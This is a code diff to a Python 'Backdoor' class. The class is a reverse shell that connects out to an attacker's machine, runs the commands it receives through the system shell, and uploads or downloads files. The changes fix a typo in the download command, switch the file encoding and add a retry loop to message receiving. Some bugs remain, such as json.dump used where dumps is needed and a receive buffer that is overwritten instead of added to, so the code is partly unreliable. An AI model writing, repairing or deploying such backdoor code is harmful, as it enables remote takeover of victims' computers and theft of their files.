@@ -9,15 +9,21 @@ import base64
 class Backdoor:
     def __init__(self, ip, port):
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.connection.connect((ip, port)) # victim pc ip
+        self.connection.connect((ip, port)) # attacker pc ip
 
     def reliable_send(self, data):
         json_data = json.dump(data)
         self.connection.send(json_data)
 
     def reliable_receive(self):
-        json_data = self.connection.recv(1024)
-        return json.loads(json_data)
+        json_data = b""
+        while True:
+            try:
+                json_data = self.connection.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
 
     def execute_system_command(self, command):
         return subprocess.check_output(command, shell=True)
@@ -32,7 +38,7 @@ class Backdoor:
     
     def write_file(self, path, content):
         with open(path, "wb") as f:
-            f.write(base64.b85decode(content))
+            f.write(base64.b64decode(content))
             return "[+] Upload successfull."
 
     def run(self):
@@ -44,7 +50,7 @@ class Backdoor:
                     exit()
                 elif command[0] == "cd" and len(command) > 1:
                     command_result = self.change_working_directory_to(command[1])
-                elif command[0] == "doanload":
+                elif command[0] == "download":
                     command_result = self.read_file(command[1])
                 elif command[0] == "upload":
                     command_result = self.write_file(command[1], command[2])
